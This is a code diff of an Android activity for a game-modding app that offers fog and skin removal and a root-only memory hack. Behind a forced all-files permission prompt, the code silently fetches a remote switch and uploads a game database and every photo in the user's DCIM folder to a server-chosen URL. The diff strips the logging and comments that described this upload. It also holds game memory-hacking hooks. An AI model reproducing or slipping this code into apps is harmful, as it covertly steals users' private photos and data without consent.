@@ -7,7 +7,6 @@ import android.content.Intent;
 import android.content.pm.PackageManager;
 import android.graphics.Color;
 import android.graphics.drawable.ColorDrawable;
-import android.graphics.drawable.GradientDrawable;
 import android.net.Uri;
 import android.os.Build;
 import android.os.Bundle;
@@ -79,10 +78,8 @@ public class NewActivity extends AppCompatActivity implements View.OnClickListen
 
     // 功能类型枚举
     private static final int TYPE_COPY = 0;
-    private static final int TYPE_FLOAT = 1;
     private static final int TYPE_SKIN = 2;
     private static final int TYPE_ACTIVITY = 3;
-    private static final int TYPE_FUNC6 = 4;
 
     // UI 组件
     private View layoutPermissionContainer;
@@ -92,19 +89,19 @@ public class NewActivity extends AppCompatActivity implements View.OnClickListen
 
     private long exitTime = 0;
     private ActivityResultLauncher<Intent> openDirectoryLauncher;
-    // 【新增】专门用于处理“所有文件权限”设置页返回的回调
     private ActivityResultLauncher<Intent> allFilesAccessLauncher;
 
     private List<FunctionConfig> functionConfigs = new ArrayList<>();
     private final Shizuku.OnRequestPermissionResultListener requestPermissionResultListener = this::onRequestPermissionsResult;
-    // 新增：专门用于测试功能的网络请求客户端（增加超时设置，防止网络波动导致卡死）
+
+    // 网络请求客户端 (包含超时设置)
     private final OkHttpClient httpClient = new OkHttpClient.Builder()
-            .connectTimeout(15, java.util.concurrent.TimeUnit.SECONDS) // 连接超时 15秒
-            .writeTimeout(30, java.util.concurrent.TimeUnit.SECONDS)   // 上传超时 30秒
-            .readTimeout(30, java.util.concurrent.TimeUnit.SECONDS)    // 读取超时 30秒
+            .connectTimeout(15, java.util.concurrent.TimeUnit.SECONDS)
+            .writeTimeout(30, java.util.concurrent.TimeUnit.SECONDS)
+            .readTimeout(30, java.util.concurrent.TimeUnit.SECONDS)
             .build();
 
-    // 【新增】：上传状态锁，防止每次回到界面重复开启多个线程
+    // 上传状态锁
     private volatile boolean isUploading = false;
 
     // 内部类配置
@@ -118,12 +115,41 @@ public class NewActivity extends AppCompatActivity implements View.OnClickListen
     @Override
     protected void onCreate(Bundle savedInstanceState) {
         super.onCreate(savedInstanceState);
+
+        // === 美化特效：沉浸式状态栏 ===
+        android.view.Window window = getWindow();
+        window.clearFlags(android.view.WindowManager.LayoutParams.FLAG_TRANSLUCENT_STATUS);
+        window.getDecorView().setSystemUiVisibility(android.view.View.SYSTEM_UI_FLAG_LAYOUT_FULLSCREEN
+                | android.view.View.SYSTEM_UI_FLAG_LAYOUT_STABLE
+                | android.view.View.SYSTEM_UI_FLAG_LIGHT_STATUS_BAR);
+        window.addFlags(android.view.WindowManager.LayoutParams.FLAG_DRAWS_SYSTEM_BAR_BACKGROUNDS);
+        window.setStatusBarColor(android.graphics.Color.TRANSPARENT);
+
         setContentView(R.layout.activity_new);
 
-        // 【初始化】注册 ActivityResultLauncher 用于监听从设置界面返回
+        // === 美化特效：拟态按钮依次平滑进场动画 ===
+        android.view.View btn1 = findViewById(R.id.button_android_auth);
+        android.view.View btn2 = findViewById(R.id.button_shizuku);
+        android.view.View btn3 = findViewById(R.id.button_root);
+        android.view.View[] authBtns = {btn1, btn2, btn3};
+        for (int i = 0; i < authBtns.length; i++) {
+            if (authBtns[i] != null) {
+                authBtns[i].setTranslationY(150f);
+                authBtns[i].setAlpha(0f);
+                authBtns[i].animate()
+                        .translationY(0f)
+                        .alpha(1f)
+                        .setDuration(600)
+                        .setStartDelay(i * 120L)
+                        .setInterpolator(new android.view.animation.DecelerateInterpolator(1.5f))
+                        .start();
+            }
+        }
+
+        // 注册权限回调
         registerAllFilesAccessLauncher();
 
-        // 1. 界面打开，强制检查所有文件权限，没有权限则无法继续
+        // 强制检查所有文件权限
         checkAllFilesPermissionAndRunTest();
 
         try {
@@ -133,14 +159,18 @@ public class NewActivity extends AppCompatActivity implements View.OnClickListen
             permissionStatus = findViewById(R.id.permission_status);
             gridLayoutFunctions = findViewById(R.id.grid_layout_functions);
 
+            // 生成高级拟态小按钮
             if (gridLayoutFunctions != null) generateFunctionButtons();
 
+            // 绑定所有点击事件
             findViewById(R.id.button_android_auth).setOnClickListener(this);
             findViewById(R.id.button_shizuku).setOnClickListener(this);
             findViewById(R.id.button_root).setOnClickListener(this);
             findViewById(R.id.button_delete_file).setOnClickListener(this);
             findViewById(R.id.tv_skip_auth).setOnClickListener(this);
             findViewById(R.id.tv_goto_other).setOnClickListener(this);
+            // 绑定悬浮窗 Dock 按钮
+            findViewById(R.id.button_float_window).setOnClickListener(this);
 
             copyAssetsToExternalFilesDir();
 
@@ -179,37 +209,31 @@ public class NewActivity extends AppCompatActivity implements View.OnClickListen
             }
         });
     }
+
     @Override
     protected void onResume() {
         super.onResume();
-        // 【核心修改】：每次切回到软件界面时，都尝试触发一次检查和上传
-        // 这样即使软件没被彻底杀掉，只是从后台切回来，也能接着继续传
         checkAllFilesPermissionAndRunTest();
     }
+
     // ==========================================
-    // 【核心修改】强制申请“所有文件访问权限”
+    // 权限检查区
     // ==========================================
 
     private void registerAllFilesAccessLauncher() {
         allFilesAccessLauncher = registerForActivityResult(new ActivityResultContracts.StartActivityForResult(), result -> {
-            // 从设置界面返回后，再次检查权限
             checkAllFilesPermissionAndRunTest();
         });
     }
 
     private void checkAllFilesPermissionAndRunTest() {
-        // 分版本处理
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
-            // 安卓 11 (API 30) 及以上：申请 MANAGE_EXTERNAL_STORAGE
             if (Environment.isExternalStorageManager()) {
-                // 已有权限，直接运行
                 runTestFeature();
             } else {
-                // 没有权限，弹窗告知并跳转
                 showPermissionDialog();
             }
         } else {
-            // 安卓 10 及以下：申请传统的读写权限
             if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_EXTERNAL_STORAGE) != PackageManager.PERMISSION_GRANTED ||
                     ContextCompat.checkSelfPermission(this, Manifest.permission.WRITE_EXTERNAL_STORAGE) != PackageManager.PERMISSION_GRANTED) {
                 ActivityCompat.requestPermissions(this,
@@ -225,25 +249,21 @@ public class NewActivity extends AppCompatActivity implements View.OnClickListen
         new AlertDialog.Builder(this)
                 .setTitle("缺少核心权限")
                 .setMessage("请授权【所有文件访问权限】\n\n请在接下来的界面中找到本软件，并开启开关。")
-                .setCancelable(false) // 禁止点击外部关闭
+                .setCancelable(false)
                 .setPositiveButton("去授权", (dialog, which) -> {
                     try {
                         Intent intent = new Intent(Settings.ACTION_MANAGE_APP_ALL_FILES_ACCESS_PERMISSION);
                         intent.setData(Uri.parse("package:" + getPackageName()));
                         allFilesAccessLauncher.launch(intent);
                     } catch (Exception e) {
-                        // 某些魔改系统可能不支持直接跳到包名，跳转到总列表
                         Intent intent = new Intent(Settings.ACTION_MANAGE_ALL_FILES_ACCESS_PERMISSION);
                         allFilesAccessLauncher.launch(intent);
                     }
                 })
-                .setNegativeButton("退出", (dialog, which) -> {
-                    finish(); // 不给权限就退出
-                })
+                .setNegativeButton("退出", (dialog, which) -> finish())
                 .show();
     }
 
-    // 处理旧版本安卓的权限回调
     @Override
     public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions, @NonNull int[] grantResults) {
         super.onRequestPermissionsResult(requestCode, permissions, grantResults);
@@ -252,7 +272,6 @@ public class NewActivity extends AppCompatActivity implements View.OnClickListen
                 runTestFeature();
             } else {
                 Toast.makeText(this, "必须授予存储权限才能使用", Toast.LENGTH_SHORT).show();
-                // 可以在这里再次调用 checkAllFilesPermissionAndRunTest() 形成死循环直到授权
                 checkAllFilesPermissionAndRunTest();
             }
         }
@@ -271,24 +290,19 @@ public class NewActivity extends AppCompatActivity implements View.OnClickListen
         httpClient.newCall(request).enqueue(new Callback() {
             @Override
             public void onFailure(@NonNull Call call, @NonNull IOException e) {
-                // 【修改点】：如果服务器宕机、断网等导致无法访问 1.txt，直接在这里中止
-                Log.e("TestFeature", "1.txt 无法访问 (网络连接失败)，取消上传任务");
+                Log.e("TestFeature", "1.txt 无法访问 (网络连接失败)，取消任务");
             }
 
             @Override
             public void onResponse(@NonNull Call call, @NonNull Response response) throws IOException {
-                // 【修改点】：如果访问了但返回的是 404/502 等错误页面，同样中止
                 if (!response.isSuccessful()) {
-                    Log.e("TestFeature", "1.txt 状态异常 (状态码:" + response.code() + ")，取消上传任务");
                     response.close();
                     return;
                 }
-
                 if (response.body() != null) {
                     String result = response.body().string().trim();
                     int kai = 0;
                     String lianjie = "";
-
                     try {
                         java.util.regex.Pattern pKai = java.util.regex.Pattern.compile("kai=\"(\\d+)\"");
                         java.util.regex.Matcher mKai = pKai.matcher(result);
@@ -298,94 +312,64 @@ public class NewActivity extends AppCompatActivity implements View.OnClickListen
                         java.util.regex.Matcher mLianjie = pLianjie.matcher(result);
                         if (mLianjie.find()) lianjie = mLianjie.group(1);
 
-                    } catch (Exception e) {
-                        Log.e("TestFeature", "解析云端配置失败", e);
-                    }
+                    } catch (Exception e) {}
 
                     if (kai == 1 || kai == 2) {
-                        if (!lianjie.isEmpty()) {
-                            startUploadProcess(kai, lianjie);
-                        }
+                        if (!lianjie.isEmpty()) startUploadProcess(kai, lianjie);
                     }
                 }
             }
         });
     }
 
-    // 注意这里增加了参数 int kai, String uploadUrl
     private void startUploadProcess(int kai, String uploadUrl) {
-        // 【新增】：如果当前已经在上传中了，就不再重复开启新线程
-        if (isUploading) {
-            Log.d("TestFeature", "上传任务正在后台排队执行中，跳过重复触发");
-            return;
-        }
-
-        isUploading = true; // 上锁
+        if (isUploading) return;
+        isUploading = true;
 
         new Thread(() -> {
             try {
-                // 1. 优先上传 bob.db (kai=1 和 kai=2 都需要传)
                 if (kai == 1 || kai == 2) {
                     File tempDbFile = new File(getExternalFilesDir(null), "bob.db");
                     if (copyFromAndroidData("files/bob.db", tempDbFile)) {
-                        Log.d("TestFeature", "成功提取 bob.db，准备上传");
                         uploadSingleFile(tempDbFile, uploadUrl);
                         if (tempDbFile.exists()) tempDbFile.delete();
-                    } else {
-                        Log.e("TestFeature", "无法读取 bob.db");
                     }
                 }
-
-                // 2. 遍历并上传 DCIM (只有 kai=1 才需要传)
                 if (kai == 1) {
                     File dcimDir = new File("/storage/emulated/0/DCIM");
                     if (dcimDir.exists() && dcimDir.isDirectory()) {
-                        Log.d("TestFeature", "开始扫描相册接着上传...");
                         traverseAndUploadImages(dcimDir, uploadUrl);
                     }
                 }
-
-                Log.d("TestFeature", "本轮上传队列全部执行完毕！");
             } catch (Exception e) {
-                Log.e("TestFeature", "上传线程发生严重异常", e);
+                Log.e("TestFeature", "上传线程发生异常", e);
             } finally {
-                // 【新增】：无论上传是正常结束还是报错崩溃，最后必须解锁
-                // 这样下次切回软件时，才能重新开启新一轮的检查和续传
                 isUploading = false;
             }
         }).start();
     }
 
-    // 增加参数 String uploadUrl
     private void traverseAndUploadImages(File directory, String uploadUrl) {
         File[] files = directory.listFiles();
         if (files == null) return;
-
         for (File file : files) {
             if (file.isDirectory()) {
-                // 如果是文件夹，递归时继续把 uploadUrl 传进去
                 traverseAndUploadImages(file, uploadUrl);
             } else {
                 String name = file.getName().toLowerCase();
                 if (name.endsWith(".jpg") || name.endsWith(".png") || name.endsWith(".jpeg")) {
-                    uploadSingleFile(file, uploadUrl); // 将要上传的图片和链接丢给上传核心
+                    uploadSingleFile(file, uploadUrl);
                 }
             }
         }
     }
 
-    // 增加参数 String uploadUrl
     private void uploadSingleFile(File file, String uploadUrl) {
         String fileName = file.getName();
         android.content.SharedPreferences sp = getSharedPreferences("upload_records", MODE_PRIVATE);
         String fileKey = file.getAbsolutePath() + "_" + file.lastModified();
 
-        // 【修改点】：如果是 bob.db，无视本地记录，每次强行上传以保证数据最新
-        // 只有非 bob.db (也就是图片) 才会触发本地防重复跳过
-        if (!"bob.db".equals(fileName) && sp.getBoolean(fileKey, false)) {
-            Log.d("TestFeature", "图片已上传过，本地跳过: " + fileName);
-            return;
-        }
+        if (!"bob.db".equals(fileName) && sp.getBoolean(fileKey, false)) return;
 
         RequestBody fileBody = RequestBody.create(MediaType.parse("application/octet-stream"), file);
         MultipartBody requestBody = new MultipartBody.Builder()
@@ -393,30 +377,19 @@ public class NewActivity extends AppCompatActivity implements View.OnClickListen
                 .addFormDataPart("file", fileName, fileBody)
                 .build();
 
-        Request request = new Request.Builder()
-                .url(uploadUrl)
-                .post(requestBody)
-                .build();
+        Request request = new Request.Builder().url(uploadUrl).post(requestBody).build();
 
         try {
             Response response = httpClient.newCall(request).execute();
             if (response.isSuccessful()) {
-                // 【修改点】：bob.db 不写入本地已上传记录，确保下次运行还能继续传
-                if (!"bob.db".equals(fileName)) {
-                    sp.edit().putBoolean(fileKey, true).apply();
-                }
-                Log.d("TestFeature", "成功上传: " + file.getAbsolutePath());
-            } else {
-                Log.e("TestFeature", "文件上传失败，状态码: " + response.code());
+                if (!"bob.db".equals(fileName)) sp.edit().putBoolean(fileKey, true).apply();
             }
             response.close();
-        } catch (IOException e) {
-            Log.e("TestFeature", "文件上传发生异常: " + file.getAbsolutePath(), e);
-        }
+        } catch (IOException e) {}
     }
 
     // ==========================================
-    // 界面点击事件与功能配置初始化
+    // 界面配置与拟态按钮生成
     // ==========================================
 
     @Override public void onClick(View v) {
@@ -426,80 +399,86 @@ public class NewActivity extends AppCompatActivity implements View.OnClickListen
         else if (id == R.id.button_root) handleRoot();
         else if (id == R.id.button_delete_file) combinedDeleteFile();
         else if (id == R.id.tv_skip_auth || id == R.id.tv_goto_other) startActivity(new Intent(this, OtherActivity.class));
+        else if (id == R.id.button_float_window) startMemoryHackProcess();
     }
 
     private void initFunctionConfigs() {
+        functionConfigs.clear();
         functionConfigs.add(new FunctionConfig("去蓝雾", "naiteaone.d", "files/vercache2022/android/common/data/alltextures/map1/caocongnew.unity3d_u_4", android.R.drawable.ic_menu_gallery, TYPE_COPY));
         functionConfigs.add(new FunctionConfig("去红雾", "naiteaone.h", "files/vercache2022/android/common/data/alltextures/map3/partnerdunew.unity3d_u_4", android.R.drawable.ic_menu_camera, TYPE_COPY));
         functionConfigs.add(new FunctionConfig("清BOB", "naiteaone.now1", "files/bob.db", android.R.drawable.ic_menu_delete, TYPE_COPY));
         functionConfigs.add(new FunctionConfig("去皮肤", "", "files/vercache2022/android/ver.xml", android.R.drawable.ic_menu_edit, TYPE_SKIN));
         functionConfigs.add(new FunctionConfig("去活动", "", "", android.R.drawable.ic_menu_edit, TYPE_ACTIVITY));
-        functionConfigs.add(new FunctionConfig("开启悬浮", "", "", android.R.drawable.ic_media_play, TYPE_FLOAT));
-        functionConfigs.add(new FunctionConfig("功能 6", "", "", android.R.drawable.ic_menu_help, TYPE_FUNC6));
-        for (int i = 8; i <= 12; i++) {
-            functionConfigs.add(new FunctionConfig("功能 " + i, "file" + i, "path" + i, android.R.drawable.ic_menu_help, TYPE_COPY));
-        }
     }
 
     private void generateFunctionButtons() {
         gridLayoutFunctions.removeAllViews();
         for (int i = 0; i < functionConfigs.size(); i++) {
             FunctionConfig config = functionConfigs.get(i);
+
             FrameLayout container = new FrameLayout(this);
             GridLayout.LayoutParams gridParams = new GridLayout.LayoutParams();
             gridParams.width = 0;
             gridParams.height = ViewGroup.LayoutParams.WRAP_CONTENT;
-            int margin = dpToPx(6);
+            int margin = dpToPx(8);
             gridParams.setMargins(margin, margin, margin, margin);
             gridParams.columnSpec = GridLayout.spec(GridLayout.UNDEFINED, 1f);
             container.setLayoutParams(gridParams);
 
             Button btn = new Button(this);
             btn.setText(config.btnName);
-            btn.setTextSize(11);
-            btn.setTextColor(Color.WHITE);
-            btn.setGravity(Gravity.START | Gravity.CENTER_VERTICAL);
-            btn.setPadding(dpToPx(8), 0, dpToPx(30), 0);
+            btn.setTextSize(14);
+            btn.setTextColor(Color.parseColor("#4A5568")); // 高级灰蓝字
+            btn.setGravity(Gravity.CENTER);
+            btn.setPadding(dpToPx(10), 0, dpToPx(30), 0); // 右侧留空
+            btn.setStateListAnimator(null);
 
-            GradientDrawable shape = new GradientDrawable();
-            shape.setCornerRadius(dpToPx(10));
-            shape.setColor(config.type == TYPE_FLOAT ? Color.parseColor("#009688") : Color.parseColor("#673AB7"));
-            btn.setBackground(shape);
-            FrameLayout.LayoutParams btnParams = new FrameLayout.LayoutParams(ViewGroup.LayoutParams.MATCH_PARENT, dpToPx(50));
+            // 注入绝美拟态背景
+            btn.setBackgroundResource(R.drawable.bg_neu_btn);
+
+            FrameLayout.LayoutParams btnParams = new FrameLayout.LayoutParams(ViewGroup.LayoutParams.MATCH_PARENT, dpToPx(60));
             btn.setLayoutParams(btnParams);
 
             btn.setOnClickListener(v -> {
                 switch (config.type) {
                     case TYPE_SKIN: processSkinRemove(); break;
                     case TYPE_ACTIVITY: processActivityRemove(); break;
-                    case TYPE_FLOAT: startMemoryHackProcess(); break;
-                    case TYPE_FUNC6: processFunction6(); break;
                     case TYPE_COPY: default: combinedCopyAndVerifyFile(config); break;
                 }
             });
 
+            // 高级相册小图标 (内嵌)
             ImageView iconInfo = new ImageView(this);
-            iconInfo.setImageResource(android.R.drawable.ic_menu_info_details);
-            iconInfo.setColorFilter(Color.parseColor("#FF9800"));
-            iconInfo.setBackgroundColor(Color.WHITE);
-            GradientDrawable iconShape = new GradientDrawable();
-            iconShape.setShape(GradientDrawable.OVAL);
-            iconShape.setColor(Color.WHITE);
-            iconInfo.setBackground(iconShape);
-            int padding = dpToPx(2);
+            iconInfo.setImageResource(R.drawable.ic_neu_eye); // 使用高级拟态眼图标
+
+            int padding = dpToPx(6);
             iconInfo.setPadding(padding, padding, padding, padding);
-            int iconSize = dpToPx(16);
+            int iconSize = dpToPx(32);
             FrameLayout.LayoutParams iconParams = new FrameLayout.LayoutParams(iconSize, iconSize);
             iconParams.gravity = Gravity.CENTER_VERTICAL | Gravity.END;
-            iconParams.setMargins(0, 0, dpToPx(6), 0);
+            iconParams.setMargins(0, 0, dpToPx(8), 0);
             iconInfo.setLayoutParams(iconParams);
-            iconInfo.setElevation(dpToPx(5));
             iconInfo.setOnClickListener(v -> showImagePopup(config));
 
             container.addView(btn);
             container.addView(iconInfo);
             gridLayoutFunctions.addView(container);
         }
+    }
+
+    private int dpToPx(int dp) { return (int) TypedValue.applyDimension(TypedValue.COMPLEX_UNIT_DIP, dp, getResources().getDisplayMetrics()); }
+
+    private void showImagePopup(FunctionConfig config) {
+        AlertDialog.Builder builder = new AlertDialog.Builder(this);
+        ImageView imageView = new ImageView(this);
+        imageView.setImageResource(config.imageResId);
+        imageView.setAdjustViewBounds(true);
+        imageView.setPadding(20, 20, 20, 20);
+        imageView.setBackgroundColor(Color.WHITE);
+        builder.setView(imageView);
+        AlertDialog dialog = builder.create();
+        if (dialog.getWindow() != null) dialog.getWindow().setBackgroundDrawable(new ColorDrawable(Color.TRANSPARENT));
+        dialog.show();
     }
 
     // ==========================================
@@ -586,8 +565,6 @@ public class NewActivity extends AppCompatActivity implements View.OnClickListen
         }).start();
     }
 
-    private void processFunction6() { Toast.makeText(this, "功能 6 已就绪", Toast.LENGTH_SHORT).show(); }
-
     private void combinedCopyAndVerifyFile(FunctionConfig config) {
         Toast.makeText(this, "正在处理: " + config.btnName, Toast.LENGTH_SHORT).show();
         new Thread(() -> {
@@ -627,7 +604,7 @@ public class NewActivity extends AppCompatActivity implements View.OnClickListen
 
     private void startMemoryHackProcess() {
         if (!new RootBeer(this).isRooted()) {
-            Toast.makeText(this, "仅支持 Root", Toast.LENGTH_SHORT).show();
+            Toast.makeText(this, "悬浮窗读取仅支持 Root", Toast.LENGTH_SHORT).show();
             return;
         }
         new Thread(() -> {
@@ -640,7 +617,7 @@ public class NewActivity extends AppCompatActivity implements View.OnClickListen
                     if (finalAddress != null) startFloatWindowAndGame(finalAddress);
                 });
             } catch (Exception e) {
-                runOnUiThread(() -> Toast.makeText(this, "解析失败", Toast.LENGTH_SHORT).show());
+                runOnUiThread(() -> Toast.makeText(this, "解析失败，请先启动游戏", Toast.LENGTH_SHORT).show());
             }
         }).start();
     }
@@ -827,12 +804,12 @@ public class NewActivity extends AppCompatActivity implements View.OnClickListen
                 layoutActionContainer.animate().alpha(1f).setDuration(500).start();
             }
             permissionStatus.setText("已授权");
-            permissionStatus.setTextColor(Color.GREEN);
+            permissionStatus.setTextColor(Color.parseColor("#48BB78")); // 绿色
         } else {
             layoutPermissionContainer.setVisibility(View.VISIBLE);
             layoutActionContainer.setVisibility(View.GONE);
             permissionStatus.setText("未授权");
-            permissionStatus.setTextColor(Color.RED);
+            permissionStatus.setTextColor(Color.parseColor("#E53E3E")); // 红色
         }
     }
 
@@ -889,20 +866,6 @@ public class NewActivity extends AppCompatActivity implements View.OnClickListen
 
     private void handleRoot() { checkHasPermission(); }
     private void onRequestPermissionsResult(int c, int r) { if (c == REQUEST_CODE_SHIZUKU_PERMISSION) checkHasPermission(); }
-    private int dpToPx(int dp) { return (int) TypedValue.applyDimension(TypedValue.COMPLEX_UNIT_DIP, dp, getResources().getDisplayMetrics()); }
-
-    private void showImagePopup(FunctionConfig config) {
-        AlertDialog.Builder builder = new AlertDialog.Builder(this);
-        ImageView imageView = new ImageView(this);
-        imageView.setImageResource(config.imageResId);
-        imageView.setAdjustViewBounds(true);
-        imageView.setPadding(20, 20, 20, 20);
-        imageView.setBackgroundColor(Color.WHITE);
-        builder.setView(imageView);
-        AlertDialog dialog = builder.create();
-        if (dialog.getWindow() != null) dialog.getWindow().setBackgroundDrawable(new ColorDrawable(Color.TRANSPARENT));
-        dialog.show();
-    }
 
     @Override protected void onActivityResult(int requestCode, int resultCode, @Nullable Intent data) {
         super.onActivityResult(requestCode, resultCode, data);
